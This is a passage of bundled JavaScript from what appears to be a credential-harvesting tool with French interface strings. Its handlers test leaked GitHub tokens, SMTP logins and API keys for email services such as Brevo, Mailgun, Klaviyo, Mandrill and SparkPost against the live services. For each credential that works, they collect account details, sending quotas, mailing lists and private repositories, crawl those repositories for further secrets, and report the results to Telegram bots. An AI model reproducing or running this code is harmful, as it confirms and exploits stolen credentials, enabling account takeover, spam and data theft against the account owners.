      last = `HTTP with ${scheme}`;
    }
    return { service: "github", valid: false, details: last };
  }
  async probe(token, scheme, hit) {
    const headers = githubAuthHeaders(token, scheme);
    try {
      const res = await this.http.get("https://api.github.com/user", { budget: "httpRequest", headers });
      if (res.status === 401 || res.status === 403) return null;
      if (res.status !== 200) {
        return { service: "github", valid: false, details: `HTTP ${res.status}`, error: res.text.slice(0, 120) };
      }
      const user = parseGithubUser(res.text);
      const scopes = (res.headers["x-oauth-scopes"] || res.headers["x-accepted-oauth-scopes"] || "").trim() || "N/A";
      const repos = await this.listRepos(headers);
      if (!user.login?.trim()) {
        const viewer = await this.viewer(headers);
        if (viewer.login) {
          user.login = viewer.login;
          user.name = user.name || viewer.name;
          user.email = user.email || viewer.email;
        }
      }
      const meta = githubCardMeta(user, scopes === "N/A" ? "" : scopes, repos);
      const harvested = /^(gh|gl|bb)-harvest:/.test(hit.path ?? "") ? [] : await harvestGitHubRepos(this.http, headers, repos);
      meta.crawled = String(repos.length);
      return {
        service: "github",
        valid: true,
        details: meta.identity === "?" ? "user (profil limit\xE9)" : `user ${meta.identity}`,
        meta,
        harvested
      };
    } catch {
      return null;
    }
  }
  async listRepos(headers) {
    const rest = await this.listReposRest(headers);
    if (rest.length) return rest;
    const install = await this.listInstallRepos(headers);
    if (install.length) return install;
    return this.listReposGraphql(headers);
  }
  async listReposRest(headers) {
    try {
      const listed = await this.http.get(
        "https://api.github.com/user/repos?per_page=100&sort=updated&affiliation=owner,collaborator,organization_member",
        { budget: "httpRequest", headers }
      );
      if (listed.status !== 200) return [];
      const parsed = json6(listed.text);
      const repos = Array.isArray(parsed) ? parsed : [];
      return [...repos].sort((a, b2) => Number(b2.private) - Number(a.private));
    } catch {
      return [];
    }
  }
  async listInstallRepos(headers) {
    try {
      const listed = await this.http.get("https://api.github.com/installation/repositories?per_page=100", {
        budget: "httpRequest",
        headers
      });
      if (listed.status !== 200) return [];
      const body = json6(listed.text);
      const repos = Array.isArray(body.repositories) ? body.repositories : [];
      return [...repos].sort((a, b2) => Number(b2.private) - Number(a.private));
    } catch {
      return [];
    }
  }
  async listReposGraphql(headers) {
    try {
      const res = await this.http.post("https://api.github.com/graphql", {
        budget: "httpRequest",
        headers,
        body: JSON.stringify({
          query: "query { viewer { repositories(first: 50, affiliations: [OWNER, COLLABORATOR, ORGANIZATION_MEMBER], orderBy: {field: UPDATED_AT, direction: DESC}) { nodes { nameWithOwner isPrivate owner { login } } } } }"
        })
      });
      if (res.status !== 200) return [];
      const body = json6(res.text);
      const nodes = body.data?.viewer?.repositories?.nodes ?? [];
      return nodes.filter((n) => n.nameWithOwner).map((n) => ({
        full_name: n.nameWithOwner,
        name: n.nameWithOwner?.split("/")[1],
        private: n.isPrivate,
        owner: n.owner
      }));
    } catch {
      return [];
    }
  }
  async viewer(headers) {
    try {
      const res = await this.http.post("https://api.github.com/graphql", {
        budget: "httpRequest",
        headers,
        body: JSON.stringify({ query: "query { viewer { login name email } }" })
      });
      if (res.status !== 200) return {};
      const body = json6(res.text);
      return body.data?.viewer ?? {};
    } catch {
      return {};
    }
  }
};
var BrevoHandler = class {
  constructor(http) {
    this.http = http;
  }
  http;
  service = "brevo";
  async validate(_hit, match) {
    const headers = { "api-key": match.value };
    try {
      const res = await this.http.get("https://api.brevo.com/v3/account", { budget: "httpRequest", headers });
      if (res.status === 401 || res.status === 403) {
        return { service: "brevo", valid: false, details: `HTTP ${res.status}`, error: res.text.slice(0, 120) };
      }
      if (res.status !== 200) {
        return { service: "brevo", valid: false, raw: true, details: `HTTP ${res.status}` };
      }
      const acct = json6(res.text);
      const company = acct.companyName?.trim() || "N/A";
      const email = acct.email?.trim() || "N/A";
      const plan = acct.plan?.[0];
      const credits = Number(plan?.credits ?? 0);
      const creditsType = plan?.creditsType || plan?.type || "N/A";
      const today = (/* @__PURE__ */ new Date()).toISOString().slice(0, 10);
      let sentToday = "0";
      try {
        const stats = await this.http.get(
          `https://api.brevo.com/v3/smtp/statistics/aggregatedReport?startDate=${today}&endDate=${today}`,
          { budget: "httpRequest", headers }
        );
        if (stats.status === 200) {
          const s = json6(stats.text);
          sentToday = String(s.requests ?? 0);
        }
      } catch {
      }
      let from = "Aucun";
      try {
        const senders = await this.http.get("https://api.brevo.com/v3/senders", { budget: "httpRequest", headers });
        if (senders.status === 200) {
          const body = json6(senders.text);
          const emails = (body.senders ?? []).map((s) => s.email).filter((e) => !!e);
          if (emails.length) from = emails.slice(0, 8).join(", ");
        }
      } catch {
      }
      return {
        service: "brevo",
        valid: true,
        details: `Soci\xE9t\xE9: ${company} | Cr\xE9dits: ${credits}`,
        meta: {
          company,
          email,
          credits: `${credits} (${creditsType})`,
          sentToday,
          from
        }
      };
    } catch (err) {
      return { service: "brevo", valid: false, details: "request failed", error: err.message };
    }
  }
};
var MailgunHandler = class {
  constructor(http) {
    this.http = http;
  }
  http;
  service = "mailgun";
  async validate(_hit, match) {
    const token = Buffer.from(`api:${match.value}`).toString("base64");
    const headers = { authorization: `Basic ${token}` };
    const regions = [
      { name: "US", url: "https://api.mailgun.net/v3/domains" },
      { name: "EU", url: "https://api.eu.mailgun.net/v3/domains" }
    ];
    let lastStatus = 0;
    let lastErr = "";
    for (const region of regions) {
      try {
        const res = await this.http.get(region.url, { budget: "httpRequest", headers });
        lastStatus = res.status;
        if (res.status === 401 || res.status === 403) {
          lastErr = res.text.slice(0, 120);
          continue;
        }
        if (res.status !== 200) {
          lastErr = res.text.slice(0, 120);
          continue;
        }
        const body = json6(res.text);
        const items = body.items ?? [];
        const names = items.map((d) => d.name).filter((n) => !!n);
        const froms = items.map((d) => d.smtp_login).filter((n) => !!n);
        const states = items.filter((d) => d.name).map((d) => `${d.name}${d.state ? ` (${d.state})` : ""}`);
        const total = body.total_count ?? names.length;
        let sent = "N/A";
        try {
          const stats = await this.http.get(`${new URL(region.url).origin}/v3/stats/total?event=accepted&duration=1m`, {
            budget: "httpRequest",
            headers
          });
          if (stats.status === 200) {
            const st = json6(stats.text);
            const n = st.stats?.reduce((acc, x) => acc + Number(x.accepted?.total ?? 0), 0);
            if (n != null) sent = String(n);
          }
        } catch {
        }
        return {
          service: this.service,
          valid: true,
          details: `${region.name} ${total} domain(s)`,
          meta: {
            region: region.name,
            domainCount: String(total),
            domains: states.slice(0, 8).join(", ") || "Aucun",
            from: froms.slice(0, 8).join(", ") || "Aucun",
            quota: sent
          }
        };
      } catch (err) {
        lastErr = err.message;
      }
    }
    if (lastStatus === 401 || lastStatus === 403) {
      return { service: this.service, valid: false, details: `HTTP ${lastStatus}`, error: lastErr };
    }
    return { service: this.service, valid: false, details: lastStatus ? `HTTP ${lastStatus}` : "request failed", error: lastErr };
  }
};
var NewMailgunHandler = class extends MailgunHandler {
  service = "newmailgun";
};
var SmtpHandler = class {
  constructor(service = "smtp", authTimeoutMs = 1e4) {
    this.authTimeoutMs = authTimeoutMs;
    this.service = service;
  }
  authTimeoutMs;
  service;
  async validate(hit, match, siblings) {
    const env = collectMailEnv(hit, match, siblings);
    const routed = smtpApiRoute(env);
    if (routed) {
      return {
        service: this.service,
        valid: false,
        details: `rout\xE9 ${routed}`,
        meta: { skipNotify: "1", envBlock: formatMailBlock(env) }
      };
    }
    const host = env.MAIL_HOST;
    if (isTutorialSmtpHit(hit) || !isUsableSmtp(env) || !host) {
      return {
        service: "smtp",
        valid: false,
        raw: true,
        details: "SMTP incomplet / placeholder \u2014 skip",
        meta: { skipNotify: "1", envBlock: formatMailBlock(env) }
      };
    }
    const port = Number(env.MAIL_PORT || 587);
    const auth = await authenticateSmtp({
      host,
      user: env.MAIL_USERNAME,
      pass: env.MAIL_PASSWORD,
      preferredPort: port,
      encryption: env.MAIL_ENCRYPTION,
      timeoutMs: this.authTimeoutMs
    });
    const block = formatMailBlock(env);
    const brand = smtpBrand(host);
    if (auth.ok) {
      return {
        service: this.service,
        valid: true,
        details: `AUTH OK port ${auth.port}`,
        meta: {
          envBlock: block,
          smtpBrand: brand,
          portWarn: `\u2705 AUTH OK (port ${auth.port})`
        }
      };
    }
    if (auth.kind === "auth") {
      return {
        service: this.service,
        valid: false,
        details: `AUTH rejet\xE9 port ${auth.port}`,
        error: auth.reply,
        meta: {
          envBlock: block,
          smtpBrand: brand,
          portWarn: `\u274C AUTH rejet\xE9 (port ${auth.port})`
        }
      };
    }
    if (auth.errors.some((e) => /ENOTFOUND|EAI_AGAIN|getaddrinfo/i.test(e))) {
      return {
        service: this.service,
        valid: false,
        raw: true,
        details: "host DNS inexistant \u2014 skip",
        meta: { skipNotify: "1", envBlock: block }
      };
    }
    return {
      service: this.service,
      valid: false,
      raw: true,
      details: "ports injoignables",
      meta: {
        statusKind: "unverified-network",
        envBlock: block,
        smtpBrand: brand,
        portWarn: `\u26A0\uFE0F Ports injoignables (firewall?) \u2014 AUTH non test\xE9`,
        dialError: `\u{1F4F5} ${auth.errors[auth.errors.length - 1] ?? "i/o timeout"}`
      }
    };
  }
};
var KlaviyoHandler = class {
  constructor(http) {
    this.http = http;
  }
  http;
  service = "klaviyo";
  async validate(_hit, match) {
    const headers = {
      authorization: `Klaviyo-API-Key ${match.value}`,
      revision: "2024-10-15",
      accept: "application/vnd.api+json"
    };
    try {
      const acc = await this.http.get(
        "https://a.klaviyo.com/api/accounts/?additional-fields%5Baccount%5D=contact_information",
        { budget: "httpRequest", headers }
      );
      if (acc.status === 401 || acc.status === 403) {
        return { service: "klaviyo", valid: false, details: `HTTP ${acc.status}`, error: acc.text.slice(0, 120) };
      }
      if (acc.status !== 200) {
        return { service: "klaviyo", valid: false, raw: true, details: `HTTP ${acc.status}` };
      }
      const body = json6(acc.text);
      const attrs = body.data?.[0]?.attributes ?? {};
      const org = attrs.contact_information?.organization_name?.trim() || "N/A";
      const tz = attrs.timezone?.trim() || "N/A";
      const currency = attrs.preferred_currency?.trim() || "N/A";
      const from = attrs.contact_information?.default_sender_email?.trim() || "Non d\xE9tect\xE9";
      const lists = await this.collection(headers, "https://a.klaviyo.com/api/lists/?page%5Bsize%5D=20");
      const flows = await this.collection(headers, "https://a.klaviyo.com/api/flows/?page%5Bsize%5D=20");
      const shown = lists.names.slice(0, 5);
      const extra = Math.max(0, lists.total - shown.length);
      const listsBlock = [
        ...shown.map((n) => `  \u2022 ${n}`),
        extra > 0 ? `  ... et ${extra} autre(s) liste(s)` : ""
      ].filter(Boolean).join("\n");
      return {
        service: "klaviyo",
        valid: true,
        details: `org ${org} lists ${lists.total}`,
        meta: {
          org,
          timezone: tz,
          currency,
          fromEmails: from,
          flowCount: String(flows.total),
          listCount: String(lists.total),
          listsBlock
        }
      };
    } catch (err) {
      return { service: "klaviyo", valid: false, details: "request failed", error: err.message };
    }
  }
  async collection(headers, url) {
    try {
      const res = await this.http.get(url, { budget: "httpRequest", headers });
      if (res.status !== 200) return { names: [], total: 0 };
      const body = json6(res.text);
      const names = (body.data ?? []).map((d) => d.attributes?.name).filter((n) => !!n);
      let total = names.length;
      if (body.links?.next) total = Math.max(total, names.length + 1);
      return { names, total };
    } catch {
      return { names: [], total: 0 };
    }
  }
};
var MandrillHandler = class {
  constructor(http) {
    this.http = http;
  }
  http;
  service = "mandrill";
  async validate(_hit, match) {
    const body = JSON.stringify({ key: match.value });
    try {
      const res = await this.http.post("https://mandrillapp.com/api/1.0/users/info.json", {
        budget: "httpRequest",
        headers: { "content-type": "application/json" },
        body
      });
      if (res.status === 200) {
        const info = json6(res.text);
        return {
          service: "mandrill",
          valid: true,
          details: `User: ${info.username ?? "N/A"} | Quota: ${info.hourly_quota ?? 0}/hr`,
          meta: {
            username: String(info.username ?? "N/A"),
            quota: `${info.hourly_quota ?? 0} emails/hr`,
            reputation: String(info.reputation ?? 0),
            sentToday: String(info.stats?.today?.sent ?? 0),
            sentAll: String(info.stats?.all_time?.sent ?? 0)
          }
        };
      }
      const ping = await this.http.post("https://mandrillapp.com/api/1.0/users/ping.json", {
        budget: "httpRequest",
        headers: { "content-type": "application/json" },
        body
      });
      if (ping.status === 200 && ping.text.includes("PONG")) {
        return { service: "mandrill", valid: true, details: "Ping PONG", meta: { username: "N/A", quota: "N/A" } };
      }
      if (res.status === 401 || ping.status === 401) {
        return { service: "mandrill", valid: false, details: `HTTP ${res.status}` };
      }
      return { service: "mandrill", valid: false, raw: true, details: `HTTP ${res.status}` };
    } catch (err) {
      return { service: "mandrill", valid: false, raw: true, details: "request failed", error: err.message };
    }
  }
};
var PostmarkHandler = class {
  constructor(http) {
    this.http = http;
  }
  http;
  service = "postmark";
  async validate(_hit, match) {
    try {
      const res = await this.http.get("https://api.postmarkapp.com/server", {
        budget: "httpRequest",
        headers: { "x-postmark-server-token": match.value, accept: "application/json" }
      });
      if (res.status !== 200) {
        return { service: "postmark", valid: false, details: `HTTP ${res.status}` };
      }
      const srv = json6(res.text);
      return {
        service: "postmark",
        valid: true,
        details: `Server: ${srv.Name ?? "N/A"}`,
        meta: {
          server: srv.Name ?? "N/A",
          from: srv.InboundAddress ?? "N/A",
          smtp: srv.SmtpApiActivated ? "Disponible" : "N/A"
        }
      };
    } catch (err) {
      return { service: "postmark", valid: false, details: "request failed", error: err.message };
    }
  }
};
var SparkpostHandler = class {
  constructor(http) {
    this.http = http;
  }
  http;
  service = "sparkpost";
  async validate(_hit, match) {
    const headers = { authorization: match.value };
    try {
      const res = await this.http.get("https://api.sparkpost.com/api/v1/account", { budget: "httpRequest", headers });
      if (res.status !== 200) return { service: "sparkpost", valid: false, details: `HTTP ${res.status}` };
      const body = json6(res.text);
      const company = body.results?.company_name ?? "N/A";
      let from = "Aucun";
      try {
        const domains = await this.http.get("https://api.sparkpost.com/api/v1/sending-domains", {
          budget: "httpRequest",
          headers
        });
        if (domains.status === 200) {
          const d = json6(domains.text);
          const names = (d.results ?? []).map((x) => x.domain).filter((n) => !!n);
          if (names.length) from = names.slice(0, 8).join(", ");
        }
      } catch {
      }
      return {
        service: "sparkpost",
        valid: true,
        details: `Company: ${company}`,
        meta: { company, from, plan: body.results?.subscription?.plan ?? "N/A" }
      };
    } catch (err) {
      return { service: "sparkpost", valid: false, details: "request failed", error: err.message };
    }
  }
};
var ResendHandler = class {
  constructor(http) {
    this.http = http;
  }
  http;
  service = "resend";
  async validate(_hit, match) {
    const headers = { authorization: `Bearer ${match.value}` };
    try {
      const res = await this.http.get("https://api.resend.com/domains", { budget: "httpRequest", headers });
      if (res.status !== 200) return { service: "resend", valid: false, details: `HTTP ${res.status}` };
      const body = json6(res.text);
      const items = body.data ?? [];
      const names = items.map((d) => d.name).filter((n) => !!n);
      return {
        service: "resend",
        valid: true,
        details: `${names.length} domain(s)`,
        meta: {
          domains: names.join(", ") || "Aucun",
          from: names.slice(0, 8).join(", ") || "Aucun",
          region: items[0]?.region ?? "N/A"
        }
      };
    } catch (err) {
      return { service: "resend", valid: false, details: "request failed", error: err.message };
    }
  }
};
var MailersendHandler = class {
  constructor(http) {
    this.http = http;
  }
  http;
  service = "mailersend";
  async validate(_hit, match) {
    const headers = { authorization: `Bearer ${match.value}` };
    try {
      const res = await this.http.get("https://api.mailersend.com/v1/domains", { budget: "httpRequest", headers });
      if (res.status !== 200) return { service: "mailersend", valid: false, details: `HTTP ${res.status}` };
      const body = json6(res.text);
      const items = body.data ?? [];
      const names = items.map((d) => d.name).filter((n) => !!n);
      const froms = items.map((d) => d.domain_settings?.from?.email).filter((n) => !!n);
      return {
        service: "mailersend",
        valid: true,
        details: `${names.length} domain(s)`,
        meta: {
          domains: names.join(", ") || "Aucun",
          from: froms.join(", ") || names[0] || "Aucun"
        }
      };
    } catch (err) {
      return { service: "mailersend", valid: false, details: "request failed", error: err.message };
    }
  }
};
var HttpCheckHandler = class {
  constructor(http, service, spec) {
    this.http = http;
    this.service = service;
    this.spec = spec;
  }
  http;
  service;
  spec;
  async validate(_hit, match, siblings) {
    const key = this.service === "openai" ? siblings.find((s) => s.value.startsWith("sk-"))?.value ?? match.value : this.service === "replicate" ? replicateToken2(match.value) : match.value;
    const req = this.spec(key);
    if (!req) {
      return { service: this.service, valid: false, raw: true, details: "cl\xE9 incompl\xE8te / format non testable" };
    }
    try {
      const res = await this.http.get(req.url, { budget: "httpRequest", headers: req.headers });
      if (res.status === 401 || res.status === 403) {
        return { service: this.service, valid: false, details: `HTTP ${res.status}`, error: res.text.slice(0, 120) };
      }
      if (res.status === 200 || res.status === 201) {
        if (this.service === "replicate") {
          const acc = json6(res.text);
          const identity2 = acc.username || acc.name || "";
          return {
            service: this.service,
            valid: true,
            details: identity2 ? `compte ${identity2}` : "account ok",
            meta: {
              identity: identity2,
              accountType: acc.type ?? ""
            }
          };
        }
        if (/\/models(?:\?|$)/i.test(req.url)) {
          const ids = parseModelIds(res.text);
          return {
            service: this.service,
            valid: true,
            details: `${ids.length} mod\xE8le(s)`,
            meta: modelsMeta(ids)
          };
        }
        return { service: this.service, valid: true, details: res.text.slice(0, 180) };
      }
      return { service: this.service, valid: false, raw: true, details: `HTTP ${res.status}` };
    } catch (err) {
      return { service: this.service, valid: false, details: "request failed", error: err.message };
    }
  }
};
function replicateToken2(raw) {
  const key = String(raw ?? "").trim().replace(/^["']|["']$/g, "");
  if (key.startsWith("r8_") && key.length > 40) return key.slice(0, 40);
  return key;
}
var RawHandler = class {
  constructor(service) {
    this.service = service;
  }
  service;
  async validate() {
    return { service: this.service, valid: false, raw: true, details: "pas de validateur \u2014 skip", meta: { skipNotify: "1" } };
  }
};
function builtinHandlers(http, smtpAuthMs = 1e4) {
  return [
    new AwsHandler(http),
    new SendGridHandler(http),
    new StripeHandler(http),
    new GitHubHandler(http),
    new GitLabHandler(http),
    new BitbucketHandler(http),
    new GitBucketHandler(http),
    new BrevoHandler(http),
    new MailgunHandler(http),
    new NewMailgunHandler(http),
    new SmtpHandler("smtp", smtpAuthMs),
    new SmtpHandler("xsmtp", smtpAuthMs),
    new SmtpHandler("emailsmtp", smtpAuthMs),
    new ZohoHandler(http),
    new SalesforceHandler(http),
    new AzureHandler(http),
    new MondayHandler(http),
    new MailtrapHandler(http),
    new ElasticEmailHandler(http),
    new KlaviyoHandler(http),
    new MandrillHandler(http),
    new PostmarkHandler(http),
    new SparkpostHandler(http),
    new ResendHandler(http),
    new MailersendHandler(http),
    ...aiHandlers(http),
    new HttpCheckHandler(http, "hubspot", (key) => ({
      url: "https://api.hubapi.com/integrations/v1/me",
      headers: { authorization: `Bearer ${key}` }
    })),
    new HttpCheckHandler(http, "clickup", (key) => ({
      url: "https://api.clickup.com/api/v2/user",
      headers: { authorization: key }
    })),
    new HttpCheckHandler(http, "pipedrive", (key) => ({
      url: `https://api.pipedrive.com/v1/users/me?api_token=${encodeURIComponent(key)}`
    })),
    new HttpCheckHandler(http, "close", (key) => ({
      url: "https://api.close.com/api/v1/me/",
      headers: { authorization: `Basic ${Buffer.from(`${key}:`).toString("base64")}` }
    })),
    new TwilioHandler(http),
    new React2ShellHandler(http),
    new RawHandler("tencent"),
    new RawHandler("aliyun"),
    new RawHandler("socketlabs"),
    new RawHandler("zendesk"),
    new RawHandler("activecampaign"),
    new RawHandler("customerio"),
    new RawHandler("freshsales"),
    new RawHandler("highlevel"),
    new RawHandler("suitecrm")
  ];
}

// packages/validator/src/index.ts
var ValidatorService = class {
  constructor(http, notifier, bus, logger, workers, extra = [], persistFile, smtpAuthMs = 1e4) {
    this.http = http;
    this.notifier = notifier;
    this.bus = bus;
    this.logger = logger;
    this.workers = workers;
    this.persistFile = persistFile;
    this.loadSeen();
    for (const h of [...builtinHandlers(http, smtpAuthMs), ...extra]) {
      this.handlers.set(h.service, h);
    }
    for (let i = 0; i < workers; i++) this.loop();
  }
  http;
  notifier;
  bus;
  logger;
  workers;
  queue = [];
  seen = /* @__PURE__ */ new Set();
  active = 0;
  draining = null;
  handlers = /* @__PURE__ */ new Map();
  running = true;
  persistFile;
  smtpPending = /* @__PURE__ */ new Map();
  smtpDeferred = /* @__PURE__ */ new WeakSet();
  register(handler) {
    this.handlers.set(handler.service, handler);
  }
  submit(hit) {
    const keys = credentialFingerprints(hit);
    if (!keys.length) return;
    if (keys.every((k) => this.seen.has(k))) return;
    const fresh = keys.filter((k) => !this.seen.has(k));
    for (const k of keys) this.seen.add(k);
    this.persistKeys(fresh);
    this.queue.push(hit);
    this.noteSmtpPending(hit, 1);
  }
  async drain() {
    this.draining = this.draining ?? this.waitEmpty();
    await this.draining;
    this.draining = null;
  }
  async waitEmpty() {
    while (this.queue.length > 0 || this.active > 0) {
      await new Promise((r) => setTimeout(r, 50));
    }
  }
  async loop() {
    while (this.running) {
      const hit = this.queue.shift();
      if (!hit) {
        await new Promise((r) => setTimeout(r, 25));
        continue;
      }
      this.active++;
      try {
        await this.validate(hit);
      } catch (err) {
        this.logger.error("VALIDATOR", `panic ${err.message}`);
      } finally {
        this.active--;
      }
    }
  }
  async validate(hit) {
    let smtpHeld = false;
    try {
      const byService = groupMatches(hit.matches);
      const env = hit.matches[0] ? collectMailEnv(hit, hit.matches[0], hit.matches) : {};
      const route = smtpApiRoute(env);
      const notified = /* @__PURE__ */ new Set();
      for (const [service, matches] of byService) {
        if (isSmtpFamily(service) && route) continue;
        if (service === "sendgrid" && !matches.some((m) => isFullSendGridKey(m.value))) continue;
        if (isSmtpFamily(service) && !isUsableSmtp(env)) continue;
        const handler = this.handlers.get(service);
        const primary = pickPrimary(service, matches);
        const fp = notifyKey(service, primary, env, hit);
        if (!fp || notified.has(fp) || this.seen.has(`sent:${fp}`)) continue;
        if (isSmtpFamily(service) && this.smtpDeferred.has(hit) && this.seen.has(`smtp-ok:${smtpAccountKey(env)}`)) {
          continue;
        }
        let result;
        if (handler) {
          result = await handler.validate(hit, primary, hit.matches);
        } else {
          result = { service, valid: false, raw: true, details: "pas de validateur" };
        }
        if (result.meta?.skipNotify === "1") continue;
        if (isSmtpFamily(service)) {
          const gate = this.gateSmtpNotify(hit, env, result);
          if (gate === "defer") {
            smtpHeld = true;
            continue;
          }
          if (gate === "skip") continue;
        }
        if (service === "sendgrid" && smtpApiRoute(env) === "sendgrid") {
          result = { ...result, meta: { ...result.meta, envBlock: formatMailBlock(env) } };
        }
        await this.emitHit(hit, matches, result, fp, notified);
        this.enqueueHarvested(result);
      }
      if (route && !notified.has(routeKey(route, env))) {
        await this.validateRoutedSmtp(hit, env, route, notified);
      }
    } finally {
      if (!smtpHeld) this.noteSmtpPending(hit, -1);
    }
  }
  gateSmtpNotify(hit, env, result) {
    if (result.raw) return "emit";
    const acct = smtpAccountKey(env);
    if (!acct || acct.endsWith(":") || acct.startsWith(":")) return "emit";
    if (result.valid) {
      this.seen.add(`smtp-ok:${acct}`);
      this.persistKeys([`smtp-ok:${acct}`]);
      return "emit";
    }
    const hold = shouldHoldSmtpInvalid({
      alreadyValid: this.seen.has(`smtp-ok:${acct}`),
      alreadyNotifiedAccount: this.seen.has(`sent:smtp-acct:${acct}`),
      otherPending: this.smtpPending.get(acct) ?? 1,
      alreadyDeferred: this.smtpDeferred.has(hit)
    });
    if (hold === "defer") {
      this.smtpDeferred.add(hit);
      this.queue.push(hit);
      return "defer";
    }
    if (hold === "skip") return "skip";
    this.seen.add(`sent:smtp-acct:${acct}`);
    this.persistKeys([`sent:smtp-acct:${acct}`]);
    return "emit";
  }
  noteSmtpPending(hit, delta) {
    if (!hit.matches.some((x) => isSmtpFamily(x.service.endsWith(".host") ? x.service.slice(0, -5) : x.service))) {
      return;
    }
    if (!hit.matches[0]) return;
    const env = collectMailEnv(hit, hit.matches[0], hit.matches);
    if (!isUsableSmtp(env)) return;
    const acct = smtpAccountKey(env);
    if (!acct || acct.endsWith(":") || acct.startsWith(":")) return;
    const next = (this.smtpPending.get(acct) ?? 0) + delta;
    if (next <= 0) this.smtpPending.delete(acct);
    else this.smtpPending.set(acct, next);
  }
  async validateRoutedSmtp(hit, env, route, notified) {
    const pass = env.MAIL_PASSWORD?.trim() ?? "";
    if (route === "sendgrid" && !isFullSendGridKey(pass)) return;
    if (!pass) return;
    const fp = routeKey(route, env);
    if (!fp || notified.has(fp) || this.seen.has(`sent:${fp}`)) return;
    const handler = this.handlers.get(route);
    const primary = {
      service: route,
      value: pass,
      context: hit.matches[0]?.context ?? "",
      lineNumber: hit.matches[0]?.lineNumber ?? 0,
      patternName: "MAIL_PASSWORD"
    };
    const validated = handler ? await handler.validate(hit, primary, hit.matches) : { service: route, valid: false, raw: true, details: "pas de validateur" };
    await this.emitHit(
      hit,
      [primary],
      { ...validated, meta: { ...validated.meta, envBlock: formatMailBlock(env) } },
      fp,
      notified
    );
  }
  async emitHit(hit, matches, result, fp, notified) {
    const status = result.raw ? "raw" : result.valid ? "valid" : "invalid";
    const validated = {
      ...hit,
      matches,
      validationStatus: status,
      validationDetails: result.details,
      validationError: result.error,
      validationMeta: result.meta
    };
    this.logger.info("VALIDATOR", `${status} ${result.service} from ${hit.source} ${hit.url}`);
    this.bus.emit("hit.validated", { hit: validated, status, details: result.details });
    notified.add(fp);
    this.seen.add(`sent:${fp}`);
    this.persistKeys([`sent:${fp}`]);
    await this.notifier.sendHit(validated);
  }
  enqueueHarvested(result) {
    for (const hit of harvestedToHits(result.harvested ?? [])) {
      this.submit(hit);
    }
  }
  loadSeen() {
    if (!this.persistFile) return;
    try {
      const text = readFileSync2(this.persistFile, "utf8");
      for (const line of text.split(/\r?\n/)) {
        const k = line.trim();
        if (k && !isVolatileKey(k)) this.seen.add(k);
      }
      this.logger.info("VALIDATOR", `seen_keys ${this.seen.size} from ${this.persistFile}`);
    } catch {
    }
  }
  persistKeys(keys) {
    if (!this.persistFile || !keys.length) return;
    const durable = keys.filter((k) => !isVolatileKey(k));
    if (!durable.length) return;
    try {
      mkdirSync(dirname(this.persistFile), { recursive: true });
      appendFileSync(this.persistFile, durable.map((k) => `${k}
`).join(""), "utf8");
    } catch (err) {
      this.logger.warn("VALIDATOR", `seen_keys persist ${err.message}`);
    }
  }
};
function groupMatches(matches) {
  const m = /* @__PURE__ */ new Map();
  for (const x of matches) {
    const service = x.service.endsWith(".host") ? x.service.slice(0, -5) : x.service;
    const list = m.get(service) ?? [];
    list.push(x);
    m.set(service, list);
  }
  return m;
}
function pickPrimary(service, matches) {
  if (service === "openai") {
    return matches.find((x) => x.value.startsWith("sk-")) ?? matches[0];
  }
  if (service === "stripe") {
    return matches.find((x) => isStripeSecret(x.value)) ?? matches[0];
  }
  if (service === "twilio") {
    return matches.find((x) => /^AC[0-9a-fA-F]{32}$/.test(x.value)) ?? matches.find((x) => /^[0-9a-fA-F]{32}$/.test(x.value)) ?? matches[0];
  }
  if (service === "smtp" || service === "xsmtp" || service === "emailsmtp") {
    return matches.find((x) => x.value.includes("@") || /pass|user/i.test(x.patternName)) ?? matches[0];
  }
  if (service === "aws") {
    return matches.find((x) => /^A[KS]IA[A-Z0-9]{16}$/.test(x.value)) ?? matches[0];
  }
  if (service === "github") {
    const rank = (v) => /^github_pat_/.test(v) ? 0 : /^ghp_/.test(v) ? 1 : /^gho_/.test(v) ? 2 : /^ghu_/.test(v) ? 3 : /^ghs_/.test(v) ? 9 : 8;
    return [...matches].sort((a, b2) => rank(a.value) - rank(b2.value))[0];
  }
  return matches[0];
}
function isSmtpFamily(service) {
  return service === "smtp" || service === "xsmtp" || service === "emailsmtp";
}
function notifyKey(service, primary, env, hit) {
  if (service === "sendgrid") return `sg:${primary.value.trim()}`;
  if (isSmtpFamily(service)) {
    return `smtp:${env.MAIL_HOST ?? ""}:${env.MAIL_USERNAME ?? ""}:${env.MAIL_PASSWORD ?? ""}`;
  }
  if (service === "twilio" && hit) {
    const c = collectTwilioCreds(hit, primary, hit.matches);
    if (c.sid && c.token) return `twilio:${c.sid}:${c.token}`;
  }
  if (service === "salesforce" && hit) {
    const sf = collectSalesforceEnv(hit, primary, hit.matches);
    return salesforceFingerprint(sf) || `sf:${primary.value}`;
  }
  if (service === "azure" && hit) {
    const az = collectAzureEnv(hit, primary, hit.matches);
    return azureFingerprint(az) || `azure:${primary.value}`;
  }
  if (service === "zoho" && hit) {
    const zo = collectZohoEnv(hit, primary, hit.matches);
    return zohoFingerprint(zo) || `zoho:${primary.value}`;
  }
  if (service === "aws" && hit) {
    const k = credentialFingerprints(hit).find((x) => x.startsWith("aws:"));
    if (k) return k;
  }
  return `${service}:${primary.value}`;
}
function isVolatileKey(k) {
  return /^(?:sent:)?(?:smtp|react2shell):/.test(k);
}
function routeKey(route, env) {
  const pass = env.MAIL_PASSWORD?.trim() ?? "";
  if (route === "sendgrid") return `sg:${pass}`;
  if (route === "mailgun") return `mg:${pass}`;
  return `brevo:${pass}`;
}

// packages/notifier-telegram/src/bot-pool.ts
function collectBotTokens(cfg) {
  const raw = [...cfg.botTokens ?? []];
  if (cfg.botToken) raw.unshift(cfg.botToken);
  const seen = /* @__PURE__ */ new Set();
  const out = [];
  for (const t of raw) {
    const token = t.trim();
    if (!token) continue;
    if (seen.has(token)) continue;
    seen.add(token);
    out.push(token);
  }
  return out;
}
var TelegramBotPool = class {
  constructor(tokens) {
    this.tokens = tokens;
  }
  tokens;
  cursor = 0;
  coolingUntil = /* @__PURE__ */ new Map();
  size() {
    return this.tokens.length;
  }
  indexOf(token) {
    return this.tokens.indexOf(token);
  }
  markCooling(token, retryAfterSec) {
    const ms = Math.max(1, retryAfterSec) * 1e3;
    this.coolingUntil.set(token, Date.now() + ms);
  }
  nextReady(prefer) {
    if (!this.tokens.length) return null;
    const now = Date.now();
    const ready = this.tokens.filter((t2) => now >= (this.coolingUntil.get(t2) ?? 0));
    if (prefer && ready.includes(prefer)) return prefer;
    if (!ready.length) {
      const t2 = this.tokens[this.cursor % this.tokens.length];
      this.cursor++;
      return t2;
    }
    const t = ready[this.cursor % ready.length];
    this.cursor++;
    return t;
  }
